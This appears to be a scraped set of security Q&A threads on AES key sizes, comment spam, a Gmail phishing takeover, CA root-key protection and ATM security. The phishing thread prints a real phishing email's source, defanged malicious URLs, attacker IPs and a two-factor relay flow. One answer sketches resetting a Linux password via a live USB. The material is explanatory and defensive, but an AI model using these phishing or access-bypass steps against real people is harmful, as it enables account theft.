For one AES is built for three key sizes 128, 192 or 256 bits. 

Currently, brute-forcing 128 bits is not even close to feasible. Hypothetically, if an AES Key had 129 bits, it would take twice as long to brute-force a 129 bit key than a 128 bit key. This means larger keys of 192 bits and 256 bits would take much much much longer to attack. It would take so incredibly long to brute-force one of these keys that the sun would stop burning before the key was realized.

2^256=115792089237316195423570985008687907853269984665640564039457584007913129639936

That's a big freaking number. That's how many possibly keys there are. Assuming the key is random, if you divide that by 2 then you have how many keys it will take on average to brute-force AES-256 

In a sense we do have the really big cipher keys you are talking of. The whole point of a symmetric key is to make it unfeasible to brute-force. In the future, if attacking a 256bit key becomes possible then keysizes will surely increase, but that is quite a ways down the road. 

The reason RSA keys are much larger than AES keys is because they are two completely different types of encryption. This means a person would not attack a RSA key the same as they would attack an AES Key. 

Attacking symmetric keys is easy. 


Start with a bitstring 000...
Decrypt ciphertext with that bitstring.
If you can read it, you succeeded.
If you cannot read it then increment the bitstring


Attacking an RSA key is different...because RSA encryption/decryption works with big semi-prime numbers...the process is mathy. With RSA, you don't have to try every possible bit string. You try far fewer than 2^1024 or 2^2048 bitstrings...but it's still not possible to bruteforce. This is why RSA and AES keys differ in size.[1] 

To sum up everything and answer your question in 1 sentence. We don't need ridiculously big symmetric keys because we already have ridiculously big symmetric keys. 256 bit encryption sounds wimpy compared to something like a 2048 bit RSA Key, but the algorithms are different and can't really be compared 'bit to bit' like that. In the future if there is a need to longer keys then there will be new algorithms developed to handle larger keys. And if we ever wanted to go bigger on current hardware, it's simply a time tradeoff. Bigger key means longer decryption time means slower communication. This is especially important for a cipher since your internet browser will establish and then use a symmetric key to send information.
AnswerKenntnis:
Processing time, pure and simple.  Everything in security is a balancing act between the need for security (keeping the bad people out), and useability (letting the good people in).  Encryption is a processing expensive operation even with dedicated hardware for doing the calculations.  

It simply isn't worth going beyond a certain level of security for most purposes because the trade offs become exponentially harder to use while offering almost no tangible benefit (since the difference between a billion years and a hundred billion years isn't that significant in practical terms).

Also, as for RSA vs AES, that's the nature of symmetric versus asymmetric cryptography.  Put simply, with symetric cryptography (where there is one shared key), there is nothing to start guessing from, so it is very hard.  For asymmetric cryptography such as RSA, you are disclosing a piece of information (the public key) that is related to the decryption key(the private key).  While the relationship is "very hard"tm to calculate, it is far weaker than having no information to work from.  Because of this, the larger key sizes are necessary to make the problem of getting a private key from a public key harder while trying to limit how much harder the math problems are for encryption and decryption.
AnswerKenntnis:
In a way, algorithms using such "insanely large" keys already exist. It's called one-time pads. Nobody really uses them in practice, though, since they require a key the length of the message you wish to encrypt and key material can never be reused (unless you want the ciphertext to become trivially breakable). Given that the purpose of encryption is to convert a large secret (the plaintext) into a small secret (the key), OTPs are only useful in very specific and highly specialized scenarios. You might as well transmit the plaintext securely, because you will need just as secure a transmission channel for the key material.

In all fairness, OTPs do have one specific use case. That is, when you need provable security in an environment where you have access to a secure communications channel at one point but need to transmit a message securely at some later time.

The OTP is provably secure because properly used and with properly generated key material, any decrypted plaintext is equally likely, and nothing about one part of the key material (is supposed to) give you any insight into other parts of the key material or how to decrypt other parts of the message. That's easy in theory, but awfully difficult to pull off in practice. You are looking at short, high-grade military or possibly diplomatic secrets, at most.

For most people, 128- to 256-bit symmetric or 2048- to 4096-bit (assuming something like RSA) asymmetric keys is plenty enough, for reasons already described by Rell3oT, Alexander Shcheblikin, lynks, and others. Anyone wanting to attack a 256-bit-equivalent key is going to attack the cryptosystem, not the cryptography, anyway. (Obligatory XKCD link.) PRNG attacks have broken otherwise properly implemented and theoretically secure cryptosystems before, and one would be a fool to think that has happened for the last time.
AnswerKenntnis:
Adding more evidence to the "because it slows things down unnecessarily" answers, it seems like AES execution time doesn't grow as fast as RSA when key length goes up (and RC6 grows even more slowly), but it's still a 16% execution time increase to double key length, according to http://www.ibimapublishing.com/journals/CIBIMA/volume8/v8n8.html .
AnswerKenntnis:
Processing time was already mentioned. Even in that respect the time required to generate an RSA key should be mentioned separately, since it is MUCH more costly for longer keys, since you need to find prime numbers of roughly half the size of the desired RSA key.

Another topic is space, i. e. the amount of data generated. Asymmetric and symmetric ciphers operate on blocks. Even a signature over one byte need the number of bits the RSA key has, i. e. 256 byte for a 2048 bit key. Same situation with block sizes of the symmetric algorithms, which als grows with the key length. While this also seems not an argument at first sight, some severely restricted devices as smart cards are supposed to handle this (still the most secure container for the private key) and there are many applications which need to store a lot of signatures, certificates, cryptograms etc. Actually this is one of the reasons for elliptic curve cryptography, since it is cramming more security into fewer bits.
AnswerKenntnis:
The OP asked: "So in other words what is the consequences of choosing a cipher key that is too large...?" A 256-bit key is plenty strong, as proven by the comments here; however, a very secure key (which is a good thing) will simply cause a malicious person(s) to find a weakness elsewhere in the system.
QuestionKenntnis:
What is the purpose of "gibberish" comments posted to my blog?
qn_description:
Fairly frequently, the contact form on my blog gets comments that look similar to this (each field represents a text box users can enter into the HTML form on the blog):


  Name: 'ceguvzori'
  Email: 'gwizwo@avbhdu.com'
  Website: 'QrSkUPWK'
  Comment: 

vaB5LN <a href="http://pepddqfgpcwe.com/">pepddqfgpcwe</a>, 
[url=http://hvyhfrijavkm.com/]hvyhfrijavkm[/url], 
[link=http://cwiolknjxdry.com/]cwiolknjxdry[/link], http://ubcxqsgqwtza.com/



I'd consider them to be spam, but the sites they link to don't exist, so they aren't helping SEO or spreading malicious links. Not even the email host, avbhdu.com, exists. What is the purpose of these comments?
AnswersKenntnis
AnswerKenntnis:
They're probing your site. First,  whether the comment will be published. Second, note how they use several popular syntaxes for links - it's an attempt to check which of them will result in an actual HTML link. If your site lets those posts through, expect more spam, this time more malicious.
AnswerKenntnis:
Many spam filters use Bayesian analysis to determine what is spam and what isn't. These work by comparing inbound content with "known good" and/or "known bad" examples and looking for similarities. By slowly increasing the amount of junk in the "good" pile, an attacker can lower the effectiveness of the filter.
AnswerKenntnis:
They are trying to confuse any automatic spam filters you might be using.

Random strings are unlikely to trigger any blacklist-based filter, and when you are using a self-learning filter, these strings will train it with garbage-data, which can only reduce its efficiency.
QuestionKenntnis:
Don't understand how my mum's Gmail account was hacked
qn_description:
My mum (on Gmail, using Chrome) received an email from a friend's Hotmail address. She opened the email (very obviously a phishing email) and clicked a link in it. This opened a webpage with loads of medical ads on. She closed the page and deleted the email.

She did not notice anything else happen when she clicked the link. For example, she did not see a download start and did not click anything on the page that opened.

The URI of the link she clicked was hxxp://23.88.82.34/d/?sururopo=duti&bugenugamaxo=aGViZTFzaGViZUBob3RtYWlsLmNvLnVr&id=anVuYWx4QGdvb2dsZW1haWwuY29t&dokofeyo=anVuYWx4 [DON'T visit that address!]

Immediately (although she didn't know at the time) about 75 emails were sent from her Gmail address to a selection of her contacts. They are visible in the Sent Mail list in her Gmail account. This happened between 17:08 and 17:10 GMT. Here the source of one:

Return-Path: <lalala@googlemail.com>
Received: from localhost (host86-152-149-189.range86-152.btcentralplus.com. [86.152.149.189])
        by mx.google.com with ESMTPSA id r1sm16019263wia.5.2014.02.23.09.10.15
        for <lalala@hotmail.com>
        (version=TLSv1 cipher=ECDHE-RSA-RC4-SHA bits=128/128);
        Sun, 23 Feb 2014 09:10:16 -0800 (PST)
Message-ID: <530a2b78.8108b40a.6eac.5c3d@mx.google.com>
Date: Sun, 23 Feb 2014 09:10:16 -0800 (PST)
MIME-Version: 1.0
Content-Type: text/html; charset=ISO-8859-1
Content-Transfer-Encoding: quoted-printable
From: lalala@googlemail.com
Return-Path: lalala@googlemail.com
Subject: Bar gain

<span style=3D"VISIBILITY:hidden;display:none">Mount your brooms said Madam=
 Hooch Three   two   one  =20
</span><br /><u>lalala@googlemail.com has sent you 3 offline broadcast</u><=
br /><a href=3D"hxxp://23.88.82.8/d/?ba=3Djurofaxovu&maremiditigehavuve=3Da=
nVuYWx4QGdvb2dsZW1haWwuY29t&id=3DaGVsZW5fY19odWdoZXNAaG90bWFpbC5jb20=3D&guv=
iwafaloco=3DaGVsZW5fY19odWdoZXM=3D" >Locate Full Email Content</a>


Here's the Gmail "Activity information" window:


Note that the IP address in that list, 86.152.149.189, is the same as in the header of that email.

One of my mum's friends reports that she received one of the emails and clicked on the link in it. She says that her email account then sent out a load of emails too.

I don't know what my mum's IP address was at the time this happened. So maybe it was 86.152.149.189.

I don't understand how this happened. She had an impressively strong password (which I've now changed) that she doesn't use for anything else and she didn't type this password into the page that opened.

How on earth could clicking a link in an email allow an attacker authenticate themselves with the Gmail SMTP server as my mum and then to send a load of emails as her to her contacts? And how could it have got the addresses of her contacts?

Update subsequent to Iserni's answer:

My mum confirms that she did indeed enter her Gmail password when "Gmail" asked for it after the page of medical ads closed. Her aunt received one of the emails and was also asked to enter her Gmail login details. She says she did because the original email came from my mum. Clever attack
AnswersKenntnis
AnswerKenntnis:
IMPORTANT: this is based on data I got from your link, but the server might implement some protection. For example, once it has sent its "silver bullet" against a victim, it might answer with a faked "silver bullet" to the same request, so that anyone investigating is led astray. I have tried sending a fake parameter of cHVwcGFtZWxv to see whether it triggered any different behaviour, and it did not. Still, that's no great guarantee.

UPDATE - the above still holds, but I've been making tests from random IPs not traceable to my main session - the attacking server does not discriminate, and will blithely answer to a query regardless of browser, referer, and JS/Flash/Java support.



The link you received contained, already embedded in the URL, the following parameters - I have slightly changed them so the correct form won't appear in Google searches of Stack Exchange (I swapped the first letters).

jebe1shebe@hotmail.co.uk
hunalx@googlemail.com


The link injects a Javascript that first of all retrieves your location through a Geotrack API call, then loads another script. (I had initially mistaken this for a GMail command; my bad).

The second script loads a web page, but also presents several replicas of Login pages of popular accounts (Hotmail, GMail and so on) depending on the incoming email: GMail accounts get a fake GMail page, and so on, all of these pages saying what amounts to "Oooh, session expired! Would you mind logging in again?".

For example, clicking here (do not do so while logged in GMail, just in case)

hxxp://23.88.82.8/d/?p=puppa@gmail.com&jq=SVQ7RmxvcmVuY2U=


will display a fake Google account login (for a nonexisting user 'puppa').

The real login pages come from 

http://ww168.scvctlogin.com/login.srf?w...
http://ww837.https2-fb757a431bea02d1bef1fd12d814248dsessiongo4182-en.msgsecure128.com


which are fire-and-forget domains.

The server that receives the stolen usernames and passwords is apparently always the same, a ShineServers machine on 31.204.154.125, a busy little beaver. Most of these URLs have been submitted to various services and were seen as far back as January.

Phishing and Two-Factor authentication

I'm of two minds about the usefulness of TFA in this scenario. As I see it, and I may well be mistaken or overlooking something,


the victim clicks on the link
gets "disconnected" and prompted to "reconnect" by a phishing screen
enters [username and] password
attacker attempts login and gets redirected to "Enter Secure Code"
a secure code is sent to the victim
attacker sends to victim an "Enter Secure Code" screen
(most?) victims enter secure code too
victim account is compromised


What could one do


Check out the URL appearing on the address bar. Verify SSL certificates.
Never login to anything unless it comes from a bookmark or a manually typed link, paying attention to common misspellings. If a login screen appears during navigation, just close the browser and reopen it.
Enter into the paranoid habit of always inserting a wrong password first, one you would never use, then the correct one on the "Login failed" screen. If the wrong password gets accepted... (of course, the attacker might always reply WRONG! to the first attempt. He has to balance the cost of scaring some victims against the benefit potential of capturing some others. As long as the number of two-attempters is negligible, two-attempting is a winning strategy for them. If everybody does it, it won't work).
There are services, such as OpenDNS as pointed out by @Subin, or embedded in the browser itself, that verify the incoming site against a distributed list and refuse to connect to a known phishing site.


What could a developer do

Maybe, just maybe, it would be possible to develop a "This page looks like this other page" application. Probably it would be terribly heavy on the system. In its most basic and thwartable form, if the HTML code contains 'Enter Google password' and the URL is not gmail, then a large blood-red banner appears saying JUST DON'T.

Another (thwartable again) possibility is to employ a honey-token approach and deny form submissions that contain a password.

What could Google do

This is a bit of a pet peeve of mine. The phishing screen uses data on Google servers, for Pete's sake, so that those servers clearly see a login logo being requested by your mom with a referer of phishers'r'us dot com. What do those servers do? They blithely serve the logo as is! If I were to manage such a server, a request for your avatar image (or any image) from any page not on my site would, yes, indeed get an image. I would probably get in no end of trouble for the image I'd choose. But it would be very unlikely that someone would willingly enter his/her password on such a screen.

Of course, the attackers would just mirror the images on their websites. But I can think of many other tricks. For example, if a browser on 1.2.3.4 asked me for a login avatar, I might be wary of a password confirmation coming from address 9.8.7.6 a few seconds later, especially if other passwords for other accounts had come in similar circumstances from the same address in the last few minutes.

A twist: as suggested by a commenter (which I still have to thank for the insight), Google has actually oversight on the incoming requests as well as GMail displayed messages. With a bit of data analysis, it can then know with good certainty phishing sites almost in real time, and phishers mirroring sites doesn't thwart this kind of analysis very much (it is mostly based on data garnered from the victim). Then Google can supply the addresses of known sites to a browser extension (e.g. Chrome site protection).

I still think that they could do both - defend the login screen and use data mining to find out who the phishers are - but I'll accept that I am not justified in saying that Google is actually doing nothing.

More complicated tricks

Also, I might complicate the login screen with challenge/responses invisible to the user that the attacker would have to match, and based on browser fingerprinting. You want to log in, you send the password from the same login screen that prompted you. This too can be thwarted, quite easily.

But having to do twenty easy things to compromise an account is difficult. Also because if you do seventeen right, I (the server) mark your address, and maybe redirect you to a fake sandbox account if you do succeed to log in in the next hours. And then I just look at what you do. You do little, I replicate on the real account and if you're honest, you'll never even know. More than X too-similar emails, or sent too fast, and I'll know. Of course the account will remain open and blithely accept all your spam. Why not. Send it? Well... that's another matter, now, isn't it?
AnswerKenntnis:
Well, here is my guess.

Probably what happened is that the web page had an exploit which affects the browser and it simply took control of the browser itself managed to access the GMail session and used to send the e-mail from there.

Probably the exploit didn't even crack the password whatsoever.
QuestionKenntnis:
How do certification authorities store their private root keys?
qn_description:
Knowledge of a CA private key would allow MitM attackers to transparently supplant any certificates signed by that private key. It would also allow cyber criminals to start forging their own trusted certificates and selling them on the black market.

Given the huge profits that could be made with such knowledge, and the fact that a highly trusted and ubiquitous certificate (such as any of the main Verisign keys) would be a very difficult thing to revoke quickly, it stands to reason that there would be highly motivated and well funded criminal elements attempting to get their hands on such keys on a regular basis.

How do certification authorities deal with this threat? It sounds like a real nightmare, having to ring-fence the keys away from all human eyes, even the sysadmins. All the while the keys have to be used on a daily basis, often by internet-connected signing services.
AnswersKenntnis
AnswerKenntnis:
Serious certification authorities use heavy procedures. At the core, the CA key will be stored in a Hardware Security Module; but that's only part of the thing. The CA itself must be physically protected, which includes proactive and retrospective measures.

Proactive measures are about preventing attacks from succeeding. For instance, the CA will be stored in a vault, with steel doors and guards. The machines themselves are locked, with several padlocks, and nobody holds more than one padlock key. Physical security is of paramount importance; the HSM is only the deepest layer.

Retrospective measures are about recovering after an incident. The HSM will log all signatures. The machine is under 24/7 video surveillance, with off-site recording. These measures are about knowing what has happened (if you prefer, knowing a priori that, should a problem occur, we will be able to analyze it a posteriori). For instance, if "illegal" certificates have been emitted but the complete list of such certificates can be rebuilt, then recovery is as "easy" as revoking the offending certificates.

For extra recovery, the CA is often split into a long-lived root CA which is kept offline, and a short-lived intermediate CA. Both machines are in the cage and bunker; the root CA is never connected to a network. The root CA is physically accessed, with dual control (at least two people together, and video recording) on a regular basis, to emit the certificate for the intermediate CA, and the CRL. This allows revoking an intermediate CA if it got thoroughly hacked (to the point that its private key was stolen, or the list of fraudulently emitted certificates cannot be rebuilt).



Initial setup of a serious root CA involves a Key Ceremony with herds of auditors with prying eyes, and a formalism which would not have been scorned by a Chinese Emperor from the Song dynasty. No amount of auditing can guarantee the absence of vulnerabilities; however, that kind of ceremony can be used to know what was done, to show that security issues have been thought about, and, come what may, to identify the culprit if trouble arises. I have been involved in several such ceremonies; they really are a big "security theater" but have merits beyond the mere display of activities: they force people to have written procedures for everything.



The question is now: are existing CA really serious, in the way described above ? In my experience, they mostly are. If the CA has anything to do with VISA or MasterCard, then you can be sure that HSM, steel and ill-tempered pitbulls are part of the installation; VISA and MasterCard are about money and take it very seriously.

For the CA which are included in Web browsers and operating systems, the browser or OS vendor tends to require a lot of insurance. There again, this is about money; but the insurance company will then require all the physical measures and accounting and auditing. Formally, this will use certifications like WebTrust.

This is true even for infamous CA like DigiNotar or Comodo: note that while they got hacked and fake certificates were issued, the said certificates are known and were revoked (and Microsoft added them to a list of "forbidden certificates" which can be seen as a kind of "revoked, and we really mean it" -- software must go out of his way to accept them nonetheless).

The "weak" CA are mostly the State-controlled root CA. Microsoft can refuse to include a root key from a private venture, if Microsoft feels that enough insurance has not been provided (they want to be sure that the CA is financially robust, so that operations can be maintained); I know of a bank with millions of customers who tried to get their root key included in Windows, and were dismissed on the basis that they were "too small". However, Microsoft is much weaker against official CA from sovereign states; if they want to do business in country X, they cannot really afford to reject the root CA key from government X. Unfortunately, not all governments are "serious" when it comes to protecting their CA keys...
AnswerKenntnis:
On the physical side they first keep the root CA completely offline.  Typically what happens is that they set up the root CA, make subordinates, then take the root CA completely offline and take the hard drives and HSMs (sometimes even the whole server) and essentially lock them in a safe.  

Next, they segment the network to keep those subordinate/issuing CAs secure.  

Finally, on those subordinates they use HSMs to store the certificates.  

OCSP and CRLs are used to revoke certs, but it's not just that simple.  

On the procedural side, they have a crazy amount of layers including locked rooms that require multiple people at the same time to revoke/sign subordinates or roots (A Key Signing Ceremony).  These are 24/7 recorded (audio and video) and require a person of trust from the CA, in addition to the admins and executives.  It's a huge deal.  Here's the video.  

Edit:  Contrary to what Polynomial has said, from what I have seen, HSMs are commonplace for CAs, and even for large implementations of internal CAs.
AnswerKenntnis:
Not every CA (government, commercial, or private) stores private keys the same way.  Most legitimate operators use a HSM.  It's possible that the vendor publishes CRL revocation lists using a one way link from the root to the SubCa.  (Transmit-only serial cables, audio cables, QR codes, Ethernet with only a few pins connected.... etc.)

To get specific then it really depends on what product you're talking about.   

For example, every phone (Android, iPhone, Blackberry), Operating System (Linux, Windows, etc), and even some web browsers (Firefox) maintain independent trust stores.  

Each of those vendors has different standards as to which CAs are qualified to be "Root CAs" in that given product.  Specifically, each vendor has different certifications, processes and procedures (such a cold storage requirements) each CA must adhere to before being included in that root trust list.

Microsoft has the Root Certificate Program and that requires every CA to follow the following  audit standards  (which should address all your technical, and procedural questions)


ETSI 102 042
ETSI 101 456
WebTrust for CAs
WebTrust EV Readiness audits
ISO 21188 ( Note they do not accept ISO 27001 )


Specifically, the CA must complete an audit and submit audit results to Microsoft every twelve (12) months. The audit must cover the full PKI hierarchy that will be enabled by Microsoft through the assignment of Extended Key Usages (EKUs). All certificate usages that we enable must be audited periodically. The audit report must document the full scope of the PKI hierarchy including any sub-CA that issues a specific type of certificate covered by an audit. Eligible audits include:


WebTrust for Certificate Authorities v1.0 or later, completed by a licensed WebTrust for CAs auditor,
ETSI TS 101 456 v1.2.1 or later,
ETSI TS 102 042 V1.1.1 or later, or
ISO 21188:2006, ΓÇ£Public key infrastructure for financial services -- Practices and policy framework,ΓÇ¥ completed by either a licensed WebTrust for CAs auditor, or an audit authority operating according to the laws and policies for assessors in the same jurisdiction as the CA.


(Note these audit requirements don't apply to government CAs and may be different)

Read more about the technical and audit guidelines for MSFT roots here

Aside:

It's definitely possible to store a private key in a HSM that never exposes the private key (offloads the requests to that key) and permanently track every usage of that private key.  I don't remember if any of those standards require a HSM, but given the relatively minor cost of a HSM I can't imagine why it's not being done.
AnswerKenntnis:
whilst I agree with @Thomas's very thorough response above I'd like to add that I installed the root CA system for a UK banks own debit card system (each wee chip on the card is actually a certificate).

We used Thales HSM devices (6 figure ┬ú costs) that had proper tamper proof systems for tilt, temperature, physical attack and so on.

in terms of the key ceremony, which as Thomas describes has herd of auditors standing around cold machine rooms - it's more complicated than that.  You need to ensure that the key generation activity and the key transport to the HSM are separated activities and that by collusion the key cannot be compromised.  The Thales HSM tools allow the key to be split into segments, each encrypted with a transport key so that individual key holders can make their way to the key ceremony separately, by different transport (for heavens sake, no car sharing) to the location usually at the HSM in the production server room.

Please don't consider being a root CA is simple - yes, I know that you can create a Root CA using free-to-use tools - You need to work out your own risk appetite and whether you can build a root ca to match the threat model.  e.g. for debit card certificates (where the consequential loss could be "the entire bank"), the total amount spent was enormous and had lots of people running around to ensure that no single person could collude or have control of the key.  

If you are just creating a root ca as a local test system then clearly the risk model is different.

My advice would be that unless you are the size of a large organisation (Fortune 500) or it is your actual business to be a Root CA - then outsource.
AnswerKenntnis:
Rather than going to all the effort of breaking into a bunker and stealing the private key mission impossible style, one could simply crack the private key. This can all be done from the comfort of your own home. All you need is the CA Public Key, some data that was signed, sample signature, and a quantum computer. I have 75% of the stuff already, if someone has the last bit I'm happy to split the spoils 50/50.
AnswerKenntnis:
One thing that many do is use sub-certificates and revocation lists.  This doesn't mean problems don't happen and private keys have been stolen of trusted CAs, but if the CA doesn't make their private key accessible ever, they have a certain degree of protection.  They can instead use their private key to sign a derived CA cert and then use that CA cert (with a much more limited validity period) to sign certificates for distribution.  Then the master private key never has to be exposed to the network.

If a breach does happen, since they know that the sub-cert will have to specify the revocation list they control to be valid, they can also then revoke a compromised sub-cert.

An easy way to check if a particular CA does this is to check the chain of trust on the cert.  Often times, there will be one or even several CA certs in between the given certificate and the root trusted CA cert.
AnswerKenntnis:
The simple (and rather unfortunate) answer is that they don't, really. The sysadmins are trusted to be safe, and they secure their signing boxes in the same way that you'd secure any sensitive corporate server. In cases of performing CSRs there may be a human step required, but there's absolutely nothing to stop a determined attacker from compromising a CA network if they put enough time and effort in. At most, they'd be using a HSM to store the private keys, though I'd bet good money that it's not commonplace.
QuestionKenntnis:
How is an ATM secure?
qn_description:
I'm curious why an ATM computer is considered secure.  The general adage of "If an attacker has physical access to my machine, all bets are off," seems to not apply in this circumstance (since everyone has physical access to the machine).  Why is this?

I thought of the fact that many have security cameras placed over them, but this doesn't seem sufficient to keep ATMs secure, as there is no one constantly watching the camera feed and looking for suspicious behavior.  The most this could be used for is identifying an attacker after an attack has been attempted.  It seems like this is fairly easily solved through plain clothes, a mask, gloves, etc.

So if this alone isn't or shouldn't be enough of a deterrent, why do we not see ATMs getting hacked for all their cash at 4:00am?  What makes the device so secure?  Is it just a simple risk-reward analysis, where the cash in the ATM isn't worth the effort of the hack?  Or is there more to it which makes the computer secure?

Also, I noted that there have been a couple questions about ATM security (like this one and this one), but mine is about the physical security of the machine, since it violates a common security principle, not anything network related.
AnswersKenntnis
AnswerKenntnis:
I think the assumption here is wrong.  They don't have physical access to the machine.  They have supervised access to a very limited control panel for a machine which is built into a bomb-proof safe, bolted to the ground and hooked up to an alarm system with an armed response force.

Get the machine out of the vault and away from supervision and then yes... all bets are off.
AnswerKenntnis:
ATM are supposed to be tamper resistant, and to actively react upon any detected breach of physical security, notably by marking bills with some highly conspicuous and hard to remove ink, and also by committing honourable seppuku. For that matter, an ATM should be compared with HSM, payment terminals and smart card. You can imagine the ATM as a kind of Davy Crockett entrenched in Alamo fort and shouting "you'll never take me alive !". By comparison, a basic PC lacks all forms of tamper-resistance and would be more adequately compared with an open buffet at a charity event guarded by non-violent buddhist monks who will discourage discourteous behaviour by making stern faces and striking perpetrators with severe glares only.

In practice, most attacks on ATM are attacks on the ATM environment, e.g. skimming: the ATM itself is untouched, but the debit card is spied upon during its physical transit from the owner's wallet to the ATM entrails.
AnswerKenntnis:
The adage is still accurate.  Physical access to the machine is not the same as physical ability to interact with the machine.  The vast majority of attacks against a physical box involve actually altering the hardware and there is a limited amount you can do to alter the hardware of an ATM as it is locked in a safe, away from the user.

It is, however, worth noting that one of the most successful attacks against ATMs is to cover the keypad and card reader with a card reader and keypad of the attacker's own design.  They can then use this to scan the card and get the pin.  This allows them to clone the card and access the ATM themselves.

The machine itself is still safe since physical access is restricted, but the interface is not physically protected and is thus easily open to security threats.  This is why cameras often watch the ATM to look for the installation of such hardware.
AnswerKenntnis:
Today's ATMs may be more secure than yesterday's ATM's, but the track record has been spotty.


fake ATMs have been set up by criminals and used to duplicate bank cards and collect PINs. This takes advantage of the fact that whereas ATMs authenticate users via cards and PINs, users simply trust that ATMs are real by their visual appearance and bank logos.
genuine ATMs have been outfitted with criminal equipment to collect PINs, in response to which ATMs had to incorporate new physical measures.
ATMs have been simply ripped out and hauled away by criminals.
ATMs are open 24 hours a day and in deserted areas, creating opportunities for criminals to coerce victims into extracting cash. Prior to the ATM, it was not possible to kidnap someone at knifepoint and take them to a bank and 3 in the morning in a seedy part of town.
As a general observation, new security measures introduced in banking usually tend to be designed to protect the banks from liability, rather than the safety of customers or their capital.
AnswerKenntnis:
Logged out to post this just to be safe:

I've worked with ATMs in the past. Our test machines are rather insecure indeed; the OS has to be running on verified hardware, but we can get admin rights to the OS easily enough and do whatever we like. We routinely lower the firewall and open the boxes to the network (they won't have internet) so we can run automated tests. They are mostly secured two ways:


Hardware. As others have commented, ATMs in "the wild" have a number of physical security measures to prevent tampering with the box, including dynamite-proofing (by some companies in some locales where dynamite use is a common factor), ink-splattering (so if you do manage to get in, you can't use any of the cash), and anti-skimmer measures (with varying degrees of effectiveness). 
Lack of privileges. Running as intended, you never get the chance to log in as an admin user, cannot use USB devices unless they're verified ATM hardware, et cetera. Again, it's fairly simple to get the ATM to run as unintended -- they do so for installs, upgrades, and so forth -- but you can't do so from the pinpad/frontend of the ATM and the back is usually a) locked (see item 1) and/or b) inside the bank, making it very obvious what you're trying to do.
AnswerKenntnis:
To a large degree, how safe varies with the attack vector.   For instance, they're typically not safe at all from having a skimmer installed, allowing a thief to collect card information from unsuspecting users.   They're getting better by added intricately molded fascias that make installing skimmers more difficult, but even that can be overcome by a good sculptor or a 3-D printer. 

As for protecting against being broken into - They're often alarmed, so by the time a would-be thief gets into the box, the police are already there.   The best bet is to physically haul the machine away and break into in in a safe location, and the machines are often bolted or chained on location to help prevent that.
AnswerKenntnis:
I'll try to approach your question from a purely physical point of view.

Physical access still overrides almost all other security measures, this applies to ATMs as well.

Imagine the following scenario: You have a locked (awaiting username & password) PC in a locked nuclear bunker, outside you have a mouse, keyboard, and a monitor. All connected to the PC with long cables. Having acess to the keyboard and the mouse isn't very different from having RDP access in this case. You can probably send some high-voltage in the cables, thus performing a DoS attack, but that's as far as you can go.

ATMs aren't attacked simply because the risks outweigh the benefits. The ATM has an embedded security camera, there are security cameras around it, it has an internal alarm, it's placed in a securely-built small room. By the time the thieves break into the ATM, the police will probably be already there.
AnswerKenntnis:
physical security of the machine, since it violates a common security principle


Not usually. Physical access doesn't meant you can look at it or be in the same place, it means you can poke at the guts. The guts are in a heavy safe, so unless you can haul it away, have hours to cut it open in place, or are one hell of a super-duper locksmith, it's doing alright as it sits.

A well-trafficked area and public exposure are often enough because the physical attacks to access the locked parts of the machine take time (or heavy equipment).

As for ATM cameras, they're not about preventing theft from the machine. They're about identifying crime that doesn't break the ATM after the fact, such as somebody placing a skimmer or catching forced-withdrawal crimes.

As bolder attempts against the physical security of the device happen, better installation methods are found to prevent them.

So, since the interfaces that aren't on the front of the machine take opening secure locks or damaging the hardware before being able to apply specialized knowledge, it's easier to just rob the cash box or over or focus on external hacks.
AnswerKenntnis:
Well, a few factors.

I assume many of the thieves that will attempt to target ATMs fall into two categories. 


Thieves that will be deterred by physical locks.
Thieves that wants the money is the ATM so bad he is willing to physically smash open the machine.


The thieves that are actually smart enough to hack into the ATMs system to obtain the cash will probably find the risk of being caught due to being physically present not worth the amount of cash they can obtain from the ATM, considering there are probably less risky and more lucrative black market activities they can be taking part in.

There have been plenty of demonstrated exploits against ATMs though, many of them illustrated in this blog post here. I'm not sure if any of the exploits have been used in the wild though.
AnswerKenntnis:
Apparently some models of ATMs use a universal key that you can get off the internet. Giving physical access to the hardware. In 2010 a security expert demonstrated how he was able to use this (and the fact that some ATMS can be updated via phone line) to make the ATM spew out money on demand. 

As others have mentioned, the enclosures in ATMs pretty much prevent direct access to the computer inside. But if you use a skeleton key assuming that only legitimate owners would have one, or allow a random phone call full access to update your system, it doesn't matter.
AnswerKenntnis:
"If an attacker has physical access to my machine, all bets are off,"


This is generally applied to PCs/laptops/servers.  These have things like USB ports/CD drives (not to mention easy-to-remove screws from which you can poke at the innards) from which you can easily get full access. For example, if I want to get into my friends (Linux) computer, I can just boot from a live USB/CD, chroot into their Linux FS, change the password from their (or create a new user), reboot, and I now have full access. Windows is trickier, but doable. If they've put a lock on it via BIOS, then I can open it up, remove the hard drive, and then mess with it. Basically, such devices aren't made for security. They have lots of software security, but there is no provision for hardware security since keeping the hardware secure is understood to be your problem.

ATMs, on the other hand, are designed to be secure hardware wise. A well designed ATM will be tough to get into. You probably can cut a hole in the side and get physical access (after which you can take the money and/or get into the banking system), however there probably are alarms that alert the police when an ATM is being tampered with. Any USB slots/ports an ATM may have may be locked down in such a way that only authorized devices can get through. Nevertheless, people are able to get away with installing skimmers in ATM card slots or sledgehammering ATMs and running with the cash. There have been some cases demonstrated where one can flash new firmware (gasp) very quickly.
AnswerKenntnis:
ATM is secure in a same way all physical security works: your house door lock or a bank vault. It's not "impenetrable to everything", it's just not penetrable in a time allowing to grab the loot and escape.

Indeed it is simple risk-reward analysis. A house in "nice neighborhood" can do with weak locks, because it's very likely that someone will notice, call the police and they'll arrive in a short time. On the other hand, in "bad neighborhood" you often see reinforced doors, because burglar can assume that no one would care about a door being kicked open.

ATM is pretty heavily armored and locked up, so there is no physical access to the computer inside. Just to start hacking the computer you'd have to crack the shell open first. The risk-reward analysis still applies: can you crack and hack it before anybody notices? It would certainly take more than couple of hours, that's why you don't see anyone doing it at 4:00am. However, there are many examples of robberies when thieves ripped the ATM from the wall and stole it in one piece. In this way the part when being exposed can be shortened enough to make the effort worthwhile and move the lengthy part to a safer place.

Please note there is one more variable coming into play: it can't be known for sure how much money is inside the ATM. One can only guess. ATM are rarely "filled up", they are loaded with "just enough" to make it to the next scheduled loading. Sometimes the circumstances give away a hint: there was an incident in Poland when a brand new ATM was stolen the night before a grand opening of a new shopping mall. Predicting the huge crowds, ATM company filled the machine with amount of cash far larger than normal on the day before. Robbers anticipated and took advantage of that, but it still was a risky move.

To sum up:


Inner computer is not physically accessible from the outside.
Just to start hacking you need lengthy and noisy cracking open part.
Once you're equipped to crack the outer shell (to get to the computer) you might just as well continue cutting the money cases, thus alleviating the need of any computer literacy.
